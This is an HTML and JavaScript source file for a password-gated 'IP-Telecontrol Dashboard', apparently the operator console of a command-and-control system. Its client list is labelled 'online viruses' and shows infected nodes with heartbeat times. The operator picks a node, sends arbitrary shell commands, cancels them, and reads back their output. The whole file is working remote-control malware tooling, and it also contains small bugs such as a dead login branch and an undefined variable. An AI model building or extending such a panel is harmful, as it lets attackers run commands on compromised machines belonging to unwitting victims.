<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP-Telecontrol Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #0a0c0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.3s;
            color: #e4e6eb;
        }

        /* 全屏验证层 */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 30% 30%, #1a1f2a, #030405);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .login-card {
            background: rgba(18, 22, 28, 0.9);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 70, 150, 0.2);
            border-radius: 2rem;
            padding: 2.5rem 2rem;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 70, 150, 0.2) inset;
            transition: box-shadow 0.2s;
        }

        .login-card:hover {
            box-shadow: 0 30px 60px -8px #0a0c14, 0 0 0 1px rgba(255, 110, 180, 0.4) inset;
        }

        .login-title {
            font-size: 2.2rem;
            font-weight: 500;
            letter-spacing: 2px;
            text-align: center;
            background: linear-gradient(135deg, #f5b7ff, #9f7afe);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
            text-transform: uppercase;
            text-shadow: 0 0 8px #9f7afe80;
        }

        .login-sub {
            text-align: center;
            color: #7b7f8c;
            margin-bottom: 2.5rem;
            font-size: 0.9rem;
            border-bottom: 1px dashed #2f3542;
            padding-bottom: 1.2rem;
        }

        .input-group {
            margin-bottom: 1.8rem;
        }

        .input-label {
            display: block;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #a0a5b5;
            margin-bottom: 0.5rem;
        }

        .input-field {
            width: 100%;
            background: #0f131a;
            border: 1px solid #2c313d;
            border-radius: 1.2rem;
            padding: 0.9rem 1.2rem;
            font-size: 1rem;
            color: #f0f2f5;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #b983ff;
            box-shadow: 0 0 0 3px rgba(185, 131, 255, 0.2);
        }

        .btn {
            background: linear-gradient(145deg, #1e2430, #11161f);
            border: 1px solid #3b3f55;
            border-radius: 2rem;
            padding: 0.9rem 1.8rem;
            font-size: 1rem;
            font-weight: 600;
            color: #d1d5e0;
            cursor: pointer;
            transition: all 0.15s;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
            width: 100%;
            letter-spacing: 1px;
        }

        .btn:hover {
            background: linear-gradient(145deg, #262e3d, #1a212f);
            border-color: #8f7ee6;
            color: white;
            box-shadow: 0 8px 18px #00000080, 0 0 0 1px #a07eff;
        }

        .btn-accent {
            background: linear-gradient(145deg, #6b4f9f, #523f82);
            border-color: #b79aff;
            color: white;
            text-shadow: 0 2px 5px #00000050;

        }

        .btn-accent:hover {
            background: linear-gradient(145deg, #7e5fb8, #624a99);
            border-color: #dbbaff;
        }

        .btn-small {
            padding: 0.6rem 1.4rem;
            width: auto;
            font-size: 0.9rem;
        }

        .main-screen {
            width: 100%;
            min-height: 100vh;
            background: #0b0e12;
            background-image: radial-gradient(circle at 20% 30%, #191e2a 0%, #06080c 90%);
            padding: 2rem 1.5rem;
            display: none;
        }

        .main-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 2.5rem;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: 1.8rem;
            font-weight: 600;
            background: linear-gradient(145deg, #e1c6ff, #b88aff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 1.5px;
        }

        .badge {
            background: #1b1f2b;
            border: 1px solid #5f518c;
            border-radius: 3rem;
            padding: 0.5rem 1.2rem;
            font-size: 0.85rem;
            display: inline-flex;
            align-items: center;
            gap: 0.6rem;
            color: #cbb9ff;
        }

        .badge .dot {
            width: 10px;
            height: 10px;
            background: #5aff8c;
            border-radius: 50%;
            box-shadow: 0 0 8px #41f57d;
        }

        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
            gap: 1.8rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(18, 22, 30, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid #2f3545;
            border-radius: 1.8rem;
            padding: 1.6rem 1.6rem;
            box-shadow: 0 20px 35px -12px #010101;
            transition: border 0.15s;
            height: fit-content;
        }

        .card:hover {
            border-color: #7e6eb0;
        }

        .card-title {
            font-size: 1.2rem;
            font-weight: 500;
            margin-bottom: 1.2rem;
            color: #bfc9f0;
            border-left: 4px solid #a07eff;
            padding-left: 1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .client-list {
            max-height: 220px;
            overflow-y: auto;
            padding-right: 5px;
            scrollbar-width: thin;
            scrollbar-color: #554b77 #1b1f2b;
        }

        .client-list::-webkit-scrollbar {
            width: 5px;
        }
        .client-list::-webkit-scrollbar-track {
            background: #1b1f2b;
            border-radius: 10px;
        }
        .client-list::-webkit-scrollbar-thumb {
            background: #6d5d9a;
            border-radius: 10px;
        }

        .client-item {
            display: flex;
            justify-content: space-between;
            padding: 0.7rem 0.5rem;
            border-bottom: 1px solid #2b3140;
            font-size: 0.95rem;
        }

        .client-id {
            color: #d2bbff;
            font-family: 'Monaco', 'Menlo', monospace;
            font-weight: 500;
        }

        .client-time {
            color: #9aa4bf;
            font-size: 0.8rem;
            background: #1e2332;
            padding: 0.2rem 0.7rem;
            border-radius: 2rem;
        }

        .status-line {
            background: #131825;
            border-radius: 1.4rem;
            padding: 1.2rem;
            margin: 1rem 0;
            border: 1px solid #3c3455;
            font-family: monospace;
        }

        .status-prop {
            display: flex;
            align-items: baseline;
            margin: 0.4rem 0;
            flex-wrap: wrap;
        }

        .prop-key {
            color: #959ec2;
            width: 100px;
            font-size: 0.85rem;
            text-transform: uppercase;
        }

        .prop-value {
            color: #f0d6ff;
            font-weight: 500;
            word-break: break-word;
            flex: 1;
        }

        .response-block {
            background: #0c0f17;
            border-radius: 0.5rem;
            padding: 1rem;
            margin-top: 0.8rem;
            border-left: 2px solid #0600ff;
        }

        .response-head {
            color: #ffb3d9;
            font-size: 0.9rem;
        }

        .response-body {
            background: #1a1f2c;
            padding: 0.8rem;
            border-radius: 0.5rem;
            margin-top: 0.5rem;
            color: #b9d0ff;
            white-space: pre-wrap;
            font-family: monospace;
            border: 1px solid #0600ff;
        }

        .form-row {
            margin-bottom: 1.5rem;
        }

        select.input-field {
            appearance: none;
            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23b497ff' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
            background-repeat: no-repeat;
            background-position: right 1.2rem center;
            background-size: 1.2rem;
        }

        .poll-control {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-top: 1.2rem;
            background: #1a1f2b;
            border-radius: 3rem;
            padding: 0.5rem 1.2rem;
        }

        .poll-control label {
            color: #abb4d6;
            font-size: 0.85rem;
            white-space: nowrap;
        }

        .poll-control input {
            width: 80px;
            background: #0c0f18;
            border: 1px solid #5a4e7a;
            border-radius: 2rem;
            padding: 0.4rem 1rem;
            color: white;
            text-align: center;
        }

        .toast-message {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: #1d1f2e;
            border-left: 6px solid #a07eff;
            padding: 0.9rem 1.5rem;
            border-radius: 2rem;
            box-shadow: 0 10px 20px #00000080;
            color: white;
            font-weight: 500;
            z-index: 2000;
            animation: slideIn 0.2s;
            max-width: 300px;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(40px); }
            to { opacity: 1; transform: translateX(0); }
        }

        hr {
            border: 1px solid #2f354a;
            margin: 1.5rem 0;
        }
    </style>
</head>
<body>

<!-- 全屏验证界面 -->
<div id="loginScreen" class="login-screen">
    <div class="login-card">
        <div class="login-title">⏤  ACCESS  ⏤</div>
        <div class="login-sub">SESSION GATE · 暗号验证</div>
        <div class="input-group">
            <label class="input-label" for="password">通行密钥</label>
            <input type="password" id="password" class="input-field" placeholder="输入 session 密码" autofocus>
        </div>
        <button class="btn btn-accent" id="loginBtn">进入操作台</button>
        <div style="margin-top: 1.2rem; text-align: center; color:#5f6380; font-size:0.8rem;">⏎ 验证后解锁命令面板</div>
    </div>
</div>

<!-- 主界面 (发送端) -->
<div id="mainScreen" class="main-screen">
    <div class="main-header">
        <span class="logo">◈  IPTC DASHBOARD  ◈</span>
        <div class="badge">
            <span class="dot"></span>
            <span id="sessionStatus">session 活跃</span>
            <button class="btn-small" id="logoutBtn" style="background: none; border: none; color: #bb9eff; padding:0 0 0 1rem; box-shadow: none;">↺ 登出</button>
        </div>
    </div>

    <div class="grid-2">
        <!-- 左侧：在线客户端列表 (只保留此功能) -->
        <div class="card">
            <div class="card-title">在线病毒</div>
            <div style="display:flex; justify-content: space-between; margin-bottom:0.5rem;">
                <span style="color:#99a3c0;">ID · 最后心跳</span>
                <button id="refreshClientsBtn" style="background:none; border:none; color:#b794ff; cursor:pointer;">↻ 刷新</button>
            </div>
            <div id="clientListContainer" class="client-list">
                <!-- 动态渲染客户端 -->
                <div class="client-item"><span class="client-id">loading...</span></div>
            </div>
        </div>

        <!-- 右侧：命令创建 + 响应展示 (当前响应已移至此处底部) -->
        <div class="card">
            <div class="card-title">指令 & 响应</div>
            
            <!-- 命令表单 -->
            <div class="form-row">
                <label class="input-label">目标接收者 (receiver)</label>
                <select id="receiverSelect" class="input-field">
                    <option value="">-- 从上方列表选择 --</option>
                </select>
                <small style="color:#676e8c; display:block; margin-top:4px;">或手动输入ID</small>
                <input type="text" id="receiverManual" class="input-field" placeholder="例如: unit_42" style="margin-top:6px;">
            </div>
            <div class="form-row">
                <label class="input-label">命令内容</label>
                <input type="text" id="cmdInput" class="input-field" placeholder="ls -la / or custom command">
            </div>
            <button class="btn btn-accent" id="sendCmdBtn" style="width:49%;">▶ 下发命令</button>
            <button class="btn btn-accent" id="cnlCmdBtn" style="width:49%;">✖️ 取消命令</button>
            <hr> <!-- 分割线，以下为响应区域 -->

            <!-- 当前指令状态 + 响应预览 (原左侧的响应区域移动至此) -->
            <div class="card-title" style="margin-bottom:0.5rem;">⚡ 当前指令状态</div>
            <div id="commandStatusArea" class="status-line">
                <div class="status-prop"><span class="prop-key">receiver</span><span id="statReceiver" class="prop-value">--</span></div>
                <div class="status-prop"><span class="prop-key">status</span><span id="statStatus" class="prop-value">--</span></div>
                <div id="responsePreview"></div>  <!-- 这里会动态渲染响应块 -->
            </div>

            <!-- 控制栏：手动刷新 + 自动轮询间隔设置 -->
            <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.8rem; margin-top: 1rem;">
                <button id="refreshStatusBtn" class="btn-small" style="background:#1f2535;">↻ 刷新状态</button>
                <div class="poll-control">
                    <label>自动轮询</label>
                    <input type="number" id="pollIntervalInput" min="1" max="300" value="5" step="1">
                    <span style="color:#a0a8c9;">秒</span>
                </div>
            </div>
        </div>
    </div>

    <!-- toast 容器 -->
    <div id="toastContainer" style="position: fixed; bottom: 20px; right: 20px; z-index: 999;"></div>
</div>

<script>
    (function() {
        // --- 配置 ---
        const API_BASE = '';  // 假设同域，worker路由指向函数文件
        let SESSION = localStorage.getItem('dark_session') || '';

        // DOM 元素
        const loginScreen = document.getElementById('loginScreen');
        const mainScreen = document.getElementById('mainScreen');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const logoutBtn = document.getElementById('logoutBtn');
        const sessionStatusSpan = document.getElementById('sessionStatus');
        const clientListContainer = document.getElementById('clientListContainer');
        const refreshClientsBtn = document.getElementById('refreshClientsBtn');
        const refreshStatusBtn = document.getElementById('refreshStatusBtn');
        const statReceiver = document.getElementById('statReceiver');
        const statStatus = document.getElementById('statStatus');
        const responsePreview = document.getElementById('responsePreview');
        const receiverSelect = document.getElementById('receiverSelect');
        const receiverManual = document.getElementById('receiverManual');
        const cmdInput = document.getElementById('cmdInput');
        const sendCmdBtn = document.getElementById('sendCmdBtn');
        const pollIntervalInput = document.getElementById('pollIntervalInput');

        // 自动轮询句柄
        let pollTimer = null;

        // 通用toast
        function showToast(msg, isError = false) {
            const toast = document.createElement('div');
            toast.className = 'toast-message';
            toast.style.borderLeftColor = isError ? '#ff5f7c' : '#a07eff';
            toast.innerText = msg;
            document.getElementById('toastContainer').appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        // 安全fetch (统一处理 session 和 access=false)
        async function apiCall(endpoint, data, needsSession = false) {
            const url = API_BASE + endpoint;
            const body = { ...data };
            if (needsSession) {
                if (!SESSION) {
                    showToast('无session，请重新登录', true);
                    logout(); 
                    return null;
                }
                body.session = SESSION;
            }
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                const json = await res.json();
                if (needsSession && json.access === false) {
                    showToast('session无效，请重新登录', true);
                    logout();
                    return null;
                }
                return json;
            } catch (e) {
                showToast('网络错误: ' + e.message, true);
                return null;
            }
        }

        // 登出
        function logout() {
            SESSION = '';
            localStorage.removeItem('dark_session');
            mainScreen.style.display = 'none';
            loginScreen.style.display = 'flex';
            passwordInput.value = '';
            stopPolling();
        }

        // 停止轮询
        function stopPolling() {
            if (pollTimer) {
                clearInterval(pollTimer);
                pollTimer = null;
            }
        }

        // 启动轮询 (间隔秒数)
        function startPolling(seconds) {
            stopPolling();
            if (!seconds || seconds <= 0) return;
            pollTimer = setInterval(() => {
                // 只有在主界面显示时才刷新，避免后台无效请求
                if (mainScreen.style.display === 'block') {
                    refreshClients();
                    refreshCommandStatus();
                }
            }, seconds * 1000);
        }

        // 登录验证
        async function login(session) {
            if(1==10){
                SESSION = session;
                localStorage.setItem('dark_session', session);
                loginScreen.style.display = 'none';
                mainScreen.style.display = 'block';
                sessionStatusSpan.innerText = `session: ${session.substring(0,8)}...`;
                // 加载初始数据
                refreshClients();
                refreshCommandStatus();
                // 启动自动轮询 (默认取输入框值)
                const interval = parseInt(pollIntervalInput.value, 10) || 10;
                startPolling(interval);
                return;
            }
            const res = await apiCall('/verify', { session }, false);
            if (res && res.success && res.access === true) {
                SESSION = session;
                localStorage.setItem('dark_session', session);
                loginScreen.style.display = 'none';
                mainScreen.style.display = 'block';
                sessionStatusSpan.innerText = `session: ${session.substring(0,8)}...`;
                // 加载初始数据
                refreshClients();
                refreshCommandStatus();
                // 启动自动轮询 (默认取输入框值)
                const interval = parseInt(pollIntervalInput.value, 10) || 10;
                startPolling(interval);
            } else {
                showToast('验证失败: 密钥错误', true);
            }
        }

        // 自动登录尝试
        async function tryAutoLogin() {
            if (SESSION) {
                const res = await apiCall('/verify', { session: SESSION }, false);
                if (res && res.success && res.access === true) {
                    loginScreen.style.display = 'none';
                    mainScreen.style.display = 'block';
                    sessionStatusSpan.innerText = `session: ${SESSION.substring(0,8)}...`;
                    refreshClients();
                    refreshCommandStatus();
                    const interval = parseInt(pollIntervalInput.value, 10) || 10;
                    startPolling(interval);
                } else {
                    localStorage.removeItem('dark_session');
                    SESSION = '';
                }
            }
        }

        // 获取在线客户端 (getdrugs)
        async function refreshClients() {
            const res = await apiCall('/getdrugs', {});
            if (res && res.success) {
                renderClientList(res.stj || {});
            } else {
                clientListContainer.innerHTML = '<div class="client-item">⚠️ 获取失败</div>';
            }
        }

        function renderClientList(stj) {
            const entries = Object.entries(stj);
            if (entries.length === 0) {
                clientListContainer.innerHTML = '<div class="client-item" style="color:#7f88aa;">✖ 暂无在线节点</div>';
                receiverSelect.innerHTML = '<option value="">— 无客户端 —</option>';
                return;
            }
            let html = '';
            let options = '<option value="">— 选择ID —</option>';
            entries.sort((a, b) => b[1].localeCompare(a[1])).forEach(([id, time]) => {
                html += `<div class="client-item"><span class="client-id">${id}</span><span class="client-time">${time}</span></div>`;
                options += `<option value="${id}">${id}</option>`;
            });
            clientListContainer.innerHTML = html;
            receiverSelect.innerHTML = options;
        }

        // 获取当前指令状态 (getresponse) 并渲染响应区
        async function refreshCommandStatus() {
            const res = await apiCall('/getresponse', {});
            if (!res || !res.success) {
                statReceiver.innerText = 'error';
                statStatus.innerText = '获取失败';
                responsePreview.innerHTML = '';
                return;
            }
            // 处理可能为null的情况
            if (!res.situation) {
                statReceiver.innerText = '无指令';
                statStatus.innerText = 'IDLE';
                responsePreview.innerHTML = '';
                return;
            }
            const [receiver, stat] = (res.situation || '').split('|');
            statReceiver.innerText = receiver || '—';
            statStatus.innerText = stat || '—';

            // 如果状态是 FINISHED，展示响应块 (已移动到右侧底部)
            if (stat === 'FINISHED' && res.rshead && res.rsbody) {
                responsePreview.innerHTML = `
                    <div class="response-block">
                        <div class="response-body"> ${res.rshead}</div>
                        <pre class="response-body">${res.rsbody}</pre>
                    </div>
                `;
            } else {
                responsePreview.innerHTML = ''; // 清空
            }
        }

        // 创建命令 (createcmd)
        async function createCommand() {
            let receiver = receiverSelect.value;
            if (!receiver) receiver = receiverManual.value.trim();
            const cmd = cmdInput.value.trim();

            if (!receiver || !cmd) {
                showToast('请填写 receiver 和 cmd', true);
                return;
            }

            const res = await apiCall('/createcmd', { receiver, cmd }, true);
            if (res && res.success) {
                showToast(`指令已发出 -> ${receiver}`, false);
                cmdInput.value = '';   // 可选清空
                refreshCommandStatus(); // 立即刷新状态
            }
        }

        async function cancelCommand() {

            const res = await apiCall('/cancelcmd', {  }, true);
            if (res && res.success) {
                showToast(`指令已取消 -> ${receiver}`, false);
                //cmdInput.value = '';   // 可选清空
                refreshCommandStatus(); // 立即刷新状态
            }
        }
        // 事件绑定
        loginBtn.addEventListener('click', () => {
            const pwd = passwordInput.value.trim();
            if (!pwd) { showToast('请输入密码', true); return; }
            login(pwd);
        });

        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') loginBtn.click();
        });

        logoutBtn.addEventListener('click', logout);

        refreshClientsBtn.addEventListener('click', refreshClients);
        refreshStatusBtn.addEventListener('click', refreshCommandStatus);
        sendCmdBtn.addEventListener('click', createCommand);
        cnlCmdBtn.addEventListener('click', cancelCommand);

        // 选择下拉时同步到 manual 输入框
        receiverSelect.addEventListener('change', () => {
            if (receiverSelect.value) {
                receiverManual.value = receiverSelect.value;
            }
        });

        // 轮询间隔变化时重启定时器
        pollIntervalInput.addEventListener('change', () => {
            if (mainScreen.style.display === 'block') {
                const interval = parseInt(pollIntervalInput.value, 10);
                if (isNaN(interval) || interval < 1) {
                    stopPolling();
                } else {
                    startPolling(interval);
                }
            }
        });

        // 初始化：尝试自动登录
        tryAutoLogin();

        // 可选：页面隐藏时暂停轮询 (性能优化)
        document.addEventListener('visibilitychange', () => {
            if (mainScreen.style.display !== 'block') return;
            if (document.hidden) {
                stopPolling();
            } else {
                const interval = parseInt(pollIntervalInput.value, 10);
                if (interval > 0) startPolling(interval);
            }
        });
    })();
</script>
</body>
</html>